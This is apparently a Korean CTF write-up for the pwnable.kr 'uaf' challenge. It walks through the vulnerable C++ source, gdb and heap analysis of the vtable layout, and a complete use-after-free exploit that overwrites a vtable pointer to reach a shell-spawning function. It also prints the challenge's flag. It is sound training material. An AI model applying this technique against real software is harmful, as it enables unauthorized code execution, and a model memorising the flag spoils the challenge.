# [WriteUp]pwnable.kr - uaf

:black_nib:ChyKor12(sjjo0225@gmail.com)

---

```bash
uaf@prowl:~$ ls
flag  uaf  uaf.cpp
uaf@prowl:~$ cat uaf.cpp
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

긴 프로그램은 서버에서 분석하기 귀찮으니 다운받아서 풀도록 하자.

```bash
chykor12@ubuntu:~/pwnable.kr$ scp -P 2222 uaf@pwnable.kr:/home/uaf/uaf ~/pwnable.kr
uaf@pwnable.kr's password: 
uaf                                                                                                                                                                       100%   15KB  18.4KB/s   00:00    
chykor12@ubuntu:~/pwnable.kr$ scp -P 2222 uaf@pwnable.kr:/home/uaf/uaf.cpp ~/pwnable.kr
uaf@pwnable.kr's password: 
uaf.cpp                                                                                                                                                                   100% 1431     3.4KB/s   00:00 
```

---

서버에서 `uaf`와 `flag`의 권한을 보면 다음과 같다.

```bash
uaf@prowl:~$ ls -al
total 44
drwxr-x---   5 root uaf      4096 Oct 23  2016 .
drwxr-xr-x 116 root root     4096 Nov 12 21:34 ..
d---------   2 root root     4096 Sep 21  2015 .bash_history
-rw-r-----   1 root uaf_pwn    22 Sep 26  2015 flag
dr-xr-xr-x   2 root root     4096 Sep 21  2015 .irssi
drwxr-xr-x   2 root root     4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x   1 root uaf_pwn 15463 Sep 26  2015 uaf
-rw-r--r--   1 root root     1431 Sep 26  2015 uaf.cpp
```

---

`uaf.cpp` 코드를 보면, `main()`에서 먼저 `m`과 `w` 객체를 생성하고 초기화한다. 그리고 옵션을 입력받고 그에 따른 코드를 실행하는 과정을 반복한다.

- `op == 1` :  `m`과 `w`에 대해 각각 `introduce()`를 호출한다.
- `op == 2` : `atoi(argv[1])`만큼 힙 공간을 할당하고, `argv[2]`가 이름인 파일을 열어서 그 내용을 할당한 힙 공간에 저장한다.
- `op == 3` : `m`과 `w`를 할당 해제한다.

한 가지 특이한 점은, 옵션 1에 해당하는 어셈블리 코드를 보면 `introduce()`를 호출할 때 함수의 주소를 `call`하는 것이 아니라, 레지스터에 주소를 넣어 놓고 레지스터를 `call`하는 방식을 사용하고 있다는 점이다.

```bash
   0x0000000000400fcd <+265>:	mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fd1 <+269>:	mov    rax,QWORD PTR [rax]
   0x0000000000400fd4 <+272>:	add    rax,0x8
   0x0000000000400fd8 <+276>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>:	mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>:	mov    rdi,rax
   0x0000000000400fe2 <+286>:	call   rdx
   0x0000000000400fe4 <+288>:	mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000400fe8 <+292>:	mov    rax,QWORD PTR [rax]
   0x0000000000400feb <+295>:	add    rax,0x8
   0x0000000000400fef <+299>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400ff2 <+302>:	mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000400ff6 <+306>:	mov    rdi,rax
   0x0000000000400ff9 <+309>:	call   rdx
```

`rbp-0x38`에 저장된 값을 `rax`에 넣고, `rax`에 저장된 값을 `rax`에 다시 넣는다. 이 상태에서 `rax+8`에 저장된 값을 `rdx`에 넣고 그것을 실행시킨다. `main+265`에서 스택의 상태를 보면 다음과 같다.

```bash
[------------------------------------stack-------------------------------------]
0000| 0x7ffe6a79f9c0 --> 0x7ffe6a79fb08 --> 0x7ffe6a7a025c ("/home/chykor12/pwnable.kr/uaf")
0008| 0x7ffe6a79f9c8 --> 0x30000ffff 
0016| 0x7ffe6a79f9d0 --> 0x23f9c38 --> 0x6b63614a ('Jack')
0024| 0x7ffe6a79f9d8 --> 0x401177 (<_GLOBAL__sub_I_main+19>:	pop    rbp)
0032| 0x7ffe6a79f9e0 --> 0x23f9c88 --> 0x6c6c694a ('Jill')
0040| 0x7ffe6a79f9e8 --> 0x23f9c50 --> 0x401570 --> 0x40117a (<Human::give_shell()>:	push   rbp)
0048| 0x7ffe6a79f9f0 --> 0x23f9ca0 --> 0x401550 --> 0x40117a (<Human::give_shell()>:	push   rbp)
0056| 0x7ffe6a79f9f8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x0000000000400fcd in main ()
gdb-peda$ p/x $rbp-0x38
$45 = 0x7ffe6a79f9e8
```

`main+276`에서 `rax`는 `0x401578`이 될 것이다.

```bash
gdb-peda$ x/x 0x401578
0x401578 <vtable for Man+24>:	0x00000000004012d2
gdb-peda$ x/x 0x4012d2
0x4012d2 <Man::introduce()>:	0x10ec8348e5894855
```

그리고 이 주소에는 정상적인 경우라면 `introduce()`의 주소가 들어 있다. 만약 우리가 어떤 특정한 입력을 줘서 `rdx`에 `give_shell()`의 주소인 `0x40117a`를 넣을 수 있다면 쉘을 획득할 수 있을 것이다.

---

`argv[1]`에 20을 넣고, `argv[2]`에 `"flag.txt"`를 넣고 실행시켜 보자.

```bash
gdb-peda$ cat flag.txt
This is for the test
```

옵션을 입력받기 전의 heap의 상태는 다음과 같다. 청크의 주소는 실행할 때마다 바뀌기 때문에 위의 스택 상태와 연관짓지는 말자.

```bash
gdb-peda$ parse
addr                prev                size                 status              fd                bk                
0xd16000            0x0                 0x11c10              Used                None              None
0xd27c10            0x0                 0x30                 Used                None              None
0xd27c40            0x0                 0x20                 Used                None              None
0xd27c60            0xd27c38            0x30                 Used                None              None
0xd27c90            0x0                 0x20                 Used                None              None
0xd27cb0            0xd27c88            0x410                Used                None              None
0xd280c0            0x0                 0x410                Used                None              None
```

여기서 옵션 2를 입력하여 할당받으면 다음과 같이 바뀐다.

```bash
gdb-peda$ parse
addr                prev                size                 status              fd                bk                
0x1c14000           0x0                 0x11c10              Used                None              None
0x1c25c10           0x0                 0x30                 Freed                0x0              None
0x1c25c40           0x0                 0x20                 Freed                0x0              None
0x1c25c60           0x1c25c38           0x30                 Freed          0x1c25c10              None
0x1c25c90           0x0                 0x20                 Used                None              None
0x1c25cb0           0x1c25c88           0x410                Used                None              None
0x1c260c0           0x0                 0x410                Used                None              None
```

`0x1c25c90`에 위치한 size `0x20`짜리 청크 하나가 할당되었다.

```bash
[------------------------------------stack-------------------------------------]
0000| 0x7ffff07af660 --> 0x7ffff07af7a8 --> 0x7ffff07b025c ("/home/chykor12/pwnable.kr/uaf")
0008| 0x7ffff07af668 --> 0x30000ffff 
0016| 0x7ffff07af670 --> 0x1c25c38 --> 0x6b63614a ('Jack')
0024| 0x7ffff07af678 --> 0x401177 (<_GLOBAL__sub_I_main+19>:	pop    rbp)
0032| 0x7ffff07af680 --> 0x1c25c88 --> 0x6c6c694a ('Jill')
0040| 0x7ffff07af688 --> 0x1c25c50 --> 0x0 
0048| 0x7ffff07af690 --> 0x1c25ca0 --> 0x1c25c40 --> 0x0 
0056| 0x7ffff07af698 --> 0x14
...
gdb-peda$ p/x $rbp-0x38
$51 = 0x7ffff07af688
```

그런데 스택을 보면, 할당된 청크의 주소는 `rbp-0x38`이 아니라 `rbp-0x30`에 저장되어 있다.(스택에 저장된 것은 청크의 user data 영역의 주소이기 때문에 청크의 시작 주소보다 `0x10`만큼 크다.) 옵션 2를 한 번 더 주면 다음과 같이 바뀐다.

```bash
addr                prev                size                 status              fd                bk                
0x1c14000           0x0                 0x11c10              Used                None              None
0x1c25c10           0x0                 0x30                 Freed                0x0              None
0x1c25c40           0x0                 0x20                 Used                None              None
0x1c25c60           0x1c25c38           0x30                 Freed          0x1c25c10              None
0x1c25c90           0x0                 0x20                 Used                None              None
0x1c25cb0           0x74736574          0x410                Used                None              None
0x1c260c0           0x0                 0x410                Used                None              None
```

size가 `0x20`인 청크가 하나 더 할당되었다. 두 번째로 할당된 청크의 주소는 `rbp-0x38`에 적혀 있다.

여기서 생각해 보면, 원래 `rbp-0x38`에 적혀 있는 주소를 가진 청크에는 `give_shell()`의 주소가 있는 table의 주소가 적혀 있었고, 그 주소에 `0x8`을 더하여 `introduce()`의 주소가 있는 table에 접근했었다. 만약 청크에 `give_shell()`의 주소가 있는 table의 주소보다 `0x8`만큼 작은 값이 들어 있다면, 그 주소에 `0x8`을 더하여 `give_shell()`이 실행될 것으로 예상이 된다.

---

```bash
chykor12@ubuntu:~/pwnable.kr$ python -c 'print "\x68\x15\x40\x00\x00\x00\x00\x00"' > test.txt
chykor12@ubuntu:~/pwnable.kr$ ./uaf 20 test.txt
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ whoami
chykor12
```

서버에서 익스플로잇을 시도해 보자.

```bash
uaf@prowl:/usr$ mkdir /tmp/chykor12
uaf@prowl:/usr$ cd /tmp/chykor12
uaf@prowl:/tmp/chykor12$ python -c 'print "\x68\x15\x40\x00\x00\x00\x00\x00"' > test.txt
uaf@prowl:/tmp/chykor12$ ls
test.txt
uaf@prowl:/tmp/chykor12$ cd
uaf@prowl:~$ ./uaf 20 /tmp/chykor12/test.txt
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ whoami
uaf
$ cat flag
yay_f1ag_aft3r_pwning
```
